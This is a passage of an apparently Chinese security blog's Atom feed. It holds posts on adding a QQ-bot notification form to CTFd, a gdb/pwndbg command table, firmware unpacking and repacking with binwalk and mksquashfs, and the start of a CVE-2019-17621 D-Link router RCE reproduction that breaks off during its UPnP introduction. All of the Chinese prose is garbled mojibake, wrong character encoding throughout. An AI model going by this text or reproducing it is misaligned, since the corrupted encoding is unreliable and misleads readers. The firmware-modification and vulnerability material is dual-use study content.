    <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡åŸºäº CTFd Version 3.4.3 å¼€å‘ï¼Œå¯èƒ½å­˜åœ¨æºç ä¸ç›¸åŒçš„æƒ…å†µï¼Œé˜…è¯»æ—¶è¯·æ³¨æ„æ–‡ç« æ—¶æ•ˆæ€§ã€‚æœºå™¨äººä¼šä¸€ç›´æ›´æ–°ï¼Œåç»­åº”è¯¥ä¼šæœ‰ä¸€äºŒä¸‰è¡€æ’­æŠ¥ç­‰æ›´è¯¦å°½çš„åŠŸèƒ½</p><p>æ³¨ï¼šæœ¬æ–‡ä¸åšæœºå™¨äººç›¸å…³ä»£ç æ›´æ”¹ï¼Œç›´æ¥åˆ©ç”¨nonebotè‡ªå¸¦æ¥å£å®ç°</p></blockquote><h2 id="å‰ç«¯é¡µé¢ä¿®æ”¹"><a href="#å‰ç«¯é¡µé¢ä¿®æ”¹" class="headerlink" title="å‰ç«¯é¡µé¢ä¿®æ”¹"></a>å‰ç«¯é¡µé¢ä¿®æ”¹</h2><h3 id="config-html"><a href="#config-html" class="headerlink" title="config.html"></a>config.html</h3><p>æ‰“å¼€<code>CTFd/CTFd/themes/templates/config.html</code>ï¼Œæ›´æ”¹å·¦ä¾§æ ç›®æ ‡é¢˜</p><p><img src="/img/article/botv1/image-20221011092121090.png" alt="config.html"></p><h3 id="apperance-html"><a href="#apperance-html" class="headerlink" title="apperance.html"></a>apperance.html</h3><p>æ‰“å¼€<code>CTFd/CTFd/themes/templates/configs/appearance.html</code>ï¼Œåœ¨å…¶ä¸­æ’å…¥ä»£ç ï¼Œå®Œæ•´htmlå¦‚ä¸‹</p><blockquote><p>å› å¯èƒ½å­˜åœ¨CTFdä¸åŒç‰ˆæœ¬é¡µé¢ä¸åŒçš„é—®é¢˜ï¼Œè¯·è§†å…·ä½“æƒ…å†µæ›´æ”¹htmlé¡µé¢</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;tabpanel&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;tab-pane config-section active&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;appearance&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">autocomplete</span>=<span class="hljs-string">&quot;off&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;w-100&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;ctf_name&quot;</span>&gt;</span><br>Competition Name<br><span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span>Competition name displayed instead of a logo<span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;ctf_name&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;ctf_name&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;CTF Name&quot;</span></span><br><span class="hljs-tag">   &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">ctf_name</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">ctf_name</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; ctf_name &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span><br>CTF Description<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>Description for the CTF<br><span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ctf_description&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ctf_description&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;5&quot;</span>&gt;</span>&#123;&#123; ctf_description &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;bot-ip&quot;</span>&gt;</span><br>                Bot Address<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>                    the address of QQ-bot<br>                <span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>                    eg. 127.0.0.1:1234<br>                <span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;bot-ip&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;bot_ip&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span></span><br><span class="hljs-tag">&#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">bot_ip</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">bot_ip</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; bot_ip &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;group-id&quot;</span>&gt;</span><br>                QQ Group Number<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;group-id&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;group_id&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span></span><br><span class="hljs-tag">&#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">group_id</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">group_id</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; group_id &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;bot-text&quot;</span>&gt;</span><br>                Message<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>                    ep. æ­å–œ%såšå‡ºé¢˜ç›®%sï¼Œé»˜è®¤ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºç”¨æˆ·åï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºé¢˜ç›®åç§°<br>                <span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;bot-text&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;bottext&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span></span><br><span class="hljs-tag">   &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">bottext</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">bottext</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; bottext &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;botof&quot;</span>&gt;</span><br>                Turn on the Bot<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control custom-select&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;botof&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bot&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">0</span> &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">bot</span> == <span class="hljs-string">0</span> %&#125;<span class="hljs-attr">selected</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>                        OFF<br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">1</span> &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">bot</span> == <span class="hljs-string">1</span> %&#125;<span class="hljs-attr">selected</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>                        ON<br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-md btn-primary float-right&quot;</span>&gt;</span>Update<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="æ•ˆæœå±•ç¤º"><a href="#æ•ˆæœå±•ç¤º" class="headerlink" title="æ•ˆæœå±•ç¤º"></a>æ•ˆæœå±•ç¤º</h3><p><img src="/img/article/botv1/image-20221011093547622.png" alt="å‰ç«¯æ•ˆæœ"></p><p>è¿™æ ·å°±å¯ä»¥åœ¨è®¾ç½®é¡µé¢éšæ—¶æ›´æ”¹äº†ï¼Œ <code>Bot Address</code>æ˜¯Botæ¥æ”¶httpè¯·æ±‚çš„åœ°å€ï¼Œ<code>QQ Group Number</code>æ˜¯æœºå™¨äººæ‰€åœ¨çš„qqç¾¤å·ã€‚å¦‚æœæœºå™¨äººè¿è¡Œçš„åœ°å€å‘ç”Ÿå˜åŒ–ï¼Œæˆ–æƒ³æ›´æ”¹å‘æ¶ˆæ¯çš„ç¾¤å·ï¼Œåªéœ€åœ¨è¿™é‡Œæ›´æ”¹å³å¯ï¼Œç›®å‰è¿˜ä¸æ”¯æŒåŒæ—¶å¤šä¸ªç¾¤å‘é€æ¶ˆæ¯ï¼Œå‡†å¤‡ç­‰åˆ°æ·»åŠ ä¸€äºŒä¸‰è¡€åŠŸèƒ½æ—¶ä¸€èµ·æ·»åŠ ã€‚</p><h2 id="åç«¯æ›´æ”¹"><a href="#åç«¯æ›´æ”¹" class="headerlink" title="åç«¯æ›´æ”¹"></a>åç«¯æ›´æ”¹</h2><h3 id="view-py"><a href="#view-py" class="headerlink" title="view.py"></a>view.py</h3><p>æ‰“å¼€<code>CTFd/CTFd/views.py</code>ï¼Œæ·»åŠ å‡ ä¸ªå˜é‡ï¼Œç”¨äºæ¥æ”¶htmlé¡µé¢æ•°æ®</p><p><img src="/img/article/botv1/image-20221011092849492.png" alt="view.py"></p><h3 id="challenges-py"><a href="#challenges-py" class="headerlink" title="challenges.py"></a>challenges.py</h3><p>æ‰“å¼€<code>CTFd/CTFD/api/v1/challenges.py</code>ï¼Œåœ¨è§£é¢˜æˆåŠŸåï¼Œè°ƒç”¨æœºå™¨äººAPIå³å¯</p><p><img src="/img/article/botv1/image-20221011093425463.png" alt="challenges.py"></p><h3 id="è¿è¡Œæ¼”ç¤º"><a href="#è¿è¡Œæ¼”ç¤º" class="headerlink" title="è¿è¡Œæ¼”ç¤º"></a>è¿è¡Œæ¼”ç¤º</h3><p><img src="/img/article/botv1/image-20221011094014448.png" alt="æäº¤flag"></p><p><img src="/img/article/botv1/image-20221011094033270.png" alt="ç¾¤æ¶ˆæ¯æˆåŠŸå‘é€"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>gdbè°ƒè¯•å¸¸ç”¨æŒ‡ä»¤</title>
    <link href="/2022/10/03/gdb%E8%B0%83%E8%AF%95%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
    <url>/2022/10/03/gdb%E8%B0%83%E8%AF%95%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<blockquote><p>gdbå¸¸ç”¨è°ƒè¯•æŒ‡ä»¤ï¼ŒåŒ…å«pwngdbã€pwndbgã€pedaã€gefç­‰æ’ä»¶çš„æŒ‡ä»¤</p></blockquote><table><thead><tr><th align="center">å‘½ä»¤åç§°</th><th align="center">å‘½ä»¤ç¼©å†™</th><th align="center">å‘½ä»¤è¯´æ˜</th></tr></thead><tbody><tr><td align="center">run</td><td align="center">r</td><td align="center">è¿è¡Œä¸€ä¸ªå¾…è°ƒè¯•çš„ç¨‹åº</td></tr><tr><td align="center">continue</td><td align="center">c</td><td align="center">è®©æš‚åœçš„ç¨‹åºç»§ç»­è¿è¡Œ</td></tr><tr><td align="center">next</td><td align="center">n</td><td align="center">è¿è¡Œåˆ°ä¸‹ä¸€è¡Œ</td></tr><tr><td align="center">step</td><td align="center">s</td><td align="center">å•æ­¥æ‰§è¡Œï¼Œé‡åˆ°å‡½æ•°ä¼šè¿›å…¥</td></tr><tr><td align="center">until</td><td align="center">u</td><td align="center">è¿è¡Œåˆ°æŒ‡å®šè¡Œåœä¸‹æ¥</td></tr><tr><td align="center">finish</td><td align="center">fi</td><td align="center">ç»“æŸå½“å‰è°ƒç”¨å‡½æ•°ï¼Œå›åˆ°ä¸Šä¸€å±‚è°ƒç”¨å‡½æ•°å¤„</td></tr><tr><td align="center">return</td><td align="center">return</td><td align="center">ç»“æŸå½“å‰è°ƒç”¨å‡½æ•°å¹¶è¿”å›æŒ‡å®šå€¼ï¼Œåˆ°ä¸Šä¸€å±‚å‡½æ•°è°ƒç”¨å¤„</td></tr><tr><td align="center">jump</td><td align="center">j</td><td align="center">å°†å½“å‰ç¨‹åºæ‰§è¡Œæµè·³è½¬åˆ°æŒ‡å®šè¡Œæˆ–åœ°å€</td></tr><tr><td align="center">print</td><td align="center">p</td><td align="center">æ‰“å°å˜é‡æˆ–å¯„å­˜å™¨å€¼</td></tr><tr><td align="center">backtrace</td><td align="center">bt</td><td align="center">æŸ¥çœ‹å½“å‰çº¿ç¨‹çš„è°ƒç”¨å †æ ˆ</td></tr><tr><td align="center">frame</td><td align="center">f</td><td align="center">åˆ‡æ¢åˆ°å½“å‰è°ƒç”¨çº¿ç¨‹çš„æŒ‡å®šå †æ ˆ</td></tr><tr><td align="center">thread</td><td align="center">thread</td><td align="center">åˆ‡æ¢åˆ°æŒ‡å®šçº¿ç¨‹</td></tr><tr><td align="center">break</td><td align="center">b</td><td align="center">æ·»åŠ æ–­ç‚¹</td></tr><tr><td align="center">tbreak</td><td align="center">tb</td><td align="center">æ·»åŠ ä¸´æ—¶æ–­ç‚¹</td></tr><tr><td align="center">delete</td><td align="center">d</td><td align="center">åˆ é™¤æ–­ç‚¹</td></tr><tr><td align="center">enable</td><td align="center">enable</td><td align="center">å¯ç”¨æŸä¸ªæ–­ç‚¹</td></tr><tr><td align="center">disable</td><td align="center">disable</td><td align="center">ç¦ç”¨æŸä¸ªæ–­ç‚¹</td></tr><tr><td align="center">watch</td><td align="center">watch</td><td align="center">ç›‘è§†æŸä¸€ä¸ªå˜é‡æˆ–å†…å­˜åœ°å€çš„å€¼æ˜¯å¦å‘ç”Ÿå˜åŒ–</td></tr><tr><td align="center">list</td><td align="center">list</td><td align="center">æ˜¾ç¤ºæºç </td></tr><tr><td align="center">info</td><td align="center">info</td><td align="center">æŸ¥çœ‹æ–­ç‚¹ &#x2F; çº¿ç¨‹ç­‰ä¿¡æ¯</td></tr><tr><td align="center">ptype</td><td align="center">ptype</td><td align="center">æŸ¥çœ‹å˜é‡ç±»å‹</td></tr><tr><td align="center">disassemble</td><td align="center">disassemble</td><td align="center">æŸ¥çœ‹æ±‡ç¼–ä»£ç </td></tr><tr><td align="center">set args</td><td align="center">set args</td><td align="center">è®¾ç½®ç¨‹åºå¯åŠ¨å‘½ä»¤è¡Œå‚æ•°</td></tr><tr><td align="center">show args</td><td align="center">show args</td><td align="center">æŸ¥çœ‹è®¾ç½®çš„å‘½ä»¤è¡Œå‚æ•°</td></tr><tr><td align="center">heap â€“simple</td><td align="center">heap -s</td><td align="center">Simply print malloc_chunk structâ€™s contents</td></tr><tr><td align="center">heap â€“verbose</td><td align="center">heap -v</td><td align="center">Print all chunk fields, even unused ones.</td></tr><tr><td align="center">heapinfo</td><td align="center">heapinfo</td><td align="center">è¾“å‡ºfastbinï¼Œtop chunkï¼Œ unsortbinï¼Œtcacheç­‰ä¿¡æ¯</td></tr><tr><td align="center">heapbase</td><td align="center">heapbase</td><td align="center">è·å–heapåŸºå€</td></tr><tr><td align="center">libc</td><td align="center">libc</td><td align="center">è·å–libcåŸºå€</td></tr><tr><td align="center">magic</td><td align="center">magic</td><td align="center">Print useful variable and function in glibc</td></tr><tr><td align="center">at</td><td align="center">at</td><td align="center">Attach by process name</td></tr><tr><td align="center">x&#x2F;20x $addr</td><td align="center">x&#x2F;20x $addr</td><td align="center">æŸ¥çœ‹æŒ‡å®šåœ°å€å†…å®¹</td></tr></tbody></table>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€IOTã€‘å›ºä»¶è§£åŒ…åŠæ‰“åŒ…</title>
    <link href="/2022/09/16/%E3%80%90IOT%E3%80%91%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8C%85%E5%8F%8A%E6%89%93%E5%8C%85/"/>
    <url>/2022/09/16/%E3%80%90IOT%E3%80%91%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8C%85%E5%8F%8A%E6%89%93%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h2 id="è§£åŒ…"><a href="#è§£åŒ…" class="headerlink" title="è§£åŒ…"></a>è§£åŒ…</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">binwalk -eM file.bin<br></code></pre></td></tr></table></figure><h2 id="æ‰“åŒ…"><a href="#æ‰“åŒ…" class="headerlink" title="æ‰“åŒ…"></a>æ‰“åŒ…</h2><p>é¦–å…ˆæŸ¥çœ‹åŸ.binæ–‡ä»¶æ–‡ä»¶ç»“æ„</p><p><img src="/img/article/iot-bin/image-20220916182204458-1663326116419-2.png" alt="image-20220916182204458"></p><p>ç„¶ååˆ‡å‰²å‡ºæ–‡ä»¶ç›®å½•ä¹‹å‰çš„å¤´éƒ¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=file.bin of=head.bin bs=1 skip=0 count=1376400<br><span class="hljs-comment">#ifæ˜¯åŸå›ºä»¶ï¼Œofæ˜¯è¾“å‡ºæ–‡ä»¶ï¼Œbsæ˜¯å•ä½é•¿åº¦ï¼Œskipæ˜¯åç§»é‡ï¼Œcountæ˜¯åˆ†åŒºå¤§å°å–åˆ°æ–‡ä»¶ç›®å½•ä¹‹å‰</span><br></code></pre></td></tr></table></figure><p>æ­£å¸¸è§£åŒ…ï¼Œç„¶åæ›´æ”¹æ–‡ä»¶å†…å®¹ï¼Œéšååˆ¶ä½œæ–‡ä»¶ç›®å½•çš„binæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mksquashfs squashfs-root rootfs.bin -comp xz<br></code></pre></td></tr></table></figure><p>å¤´éƒ¨å’Œæ–‡ä»¶éƒ¨åˆ†è”åˆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">cat</span> header.bin rootfs.bin &gt; pwn.bin<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€IOT å­¦ä¹ ä¸‰ã€‘DLinkè·¯ç”±å™¨RCEæ¼æ´ CVE-2019-17621å¤ç°</title>
    <link href="/2022/09/16/%E3%80%90IOT%20%E5%AD%A6%E4%B9%A0%E4%B8%89%E3%80%91CVE-2019-17621%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/09/16/%E3%80%90IOT%20%E5%AD%A6%E4%B9%A0%E4%B8%89%E3%80%91CVE-2019-17621%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>é“¾æ¥ï¼š<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17621#:~:text=%EE%80%80CVE-2019-17621%EE%80%80">CVE - CVE-2019-17621 (mitre.org)</a>. The UPnP endpoint URL %2Fgena.cgi in the,UPnP service when connecting to the local network.)</p><p>The UPnP endpoint URL &#x2F;gena.cgi in the D-Link DIR-859 Wi-Fi router 1.05 and 1.06B01 Beta01 allows an Unauthenticated remote attacker to execute system commands as root, by sending a specially crafted HTTP SUBSCRIBE request to the UPnP service when connecting to the local network.</p></blockquote><p>ä»¥ä¸Šæ˜¯å®˜ç½‘çš„æè¿°ï¼Œæˆ‘è‡ªå·±ç²—ç•¥çš„ç¿»è¯‘ä¸‹ï¼š</p><blockquote><p>D-Link DIR-859 Wi-Fiè·¯ç”±å™¨çš„1.05ä¸1.06B01 Beta01ç‰ˆå›ºä»¶ä¸­UPnPçš„gena.cgiï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…ï¼Œåœ¨è¿æ¥åˆ°æœ¬åœ°ç½‘ç»œæ—¶ï¼Œé€šè¿‡å‘UPnPå‘é€ç‰¹å®šçš„HTTP SUBSCRIBEè¯·æ±‚ï¼Œä»è€Œå®ç°ä»¥rootèº«ä»½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p></blockquote><h2 id="UPnPä»‹ç»"><a href="#UPnPä»‹ç»" class="headerlink" title="UPnPä»‹ç»"></a>UPnPä»‹ç»</h2><p>åœ¨åˆ†æå‰æˆ‘ä»¬é¦–å…ˆè¦äº†è§£,ä»€ä¹ˆæ˜¯<strong>UPnP</strong></p><p>æˆ‘ä»¬è¯´çš„<strong>UPnPï¼ˆUniversal Plug and Playï¼‰</strong>å³é€šç”¨å³æ’å³ç”¨åè®®ï¼Œå…¶ä½œç”¨gena.cgiç®€å•æ¥è¯´å°±æ˜¯å¯ä»¥å½“æˆ‘ä»¬æ”¯æŒUNPNåè®®çš„è®¾å¤‡å¼€å¯è¯¥åè®®ï¼Œå½“ä¸»æœºæˆ–ä¸»æœºä¸Šçš„åº”ç”¨ç¨‹åºå‘è¯¥è®¾å¤‡å‘å‡ºç«¯å£æ˜ å°„è¯·æ±‚æ—¶ï¼Œæˆ‘ä»¬çš„è®¾å¤‡å°±ä¼šè‡ªåŠ¨ä¸ºä¸»æœºåˆ†é…ç«¯å£å¹¶è¿›è¡Œç«¯å£æ˜ å°„ï¼Œè¯¥åè®®ä¹Ÿæ˜¯ä»PNPåè®®é‡Œå¼•ç”³å‡ºæ¥çš„</p><p>è¿™é‡Œæˆ‘ä¹Ÿè¯´ä¸€ä¸‹ä¼ ç»Ÿä½¿ç”¨åè®®çš„PNPåè®®ï¼Œå³ â€œå³æ’å³ç”¨â€ï¼Œè¯¥åè®®æ”¯æŒè‡ªåŠ¨ä¸ºæ–°æ·»åŠ çš„ç¡¬ä»¶åˆ†é…ä¸­æ–­å’Œ I&#x2F;O ç«¯å£ï¼Œç”¨æˆ·æ— é¡»å†åšæ‰‹å·¥è·³çº¿ï¼Œä¹Ÿä¸å¿…ä½¿ç”¨è½¯ä»¶é…ç½®ç¨‹åºã€‚</p><p>è€Œæ‰€è°“åšæ‰‹å·¥è·³çº¿ï¼Œæˆ‘ä»¬å°±ä¸å¾—ä¸è¯´æœ€åŸå§‹çš„æ·»åŠ 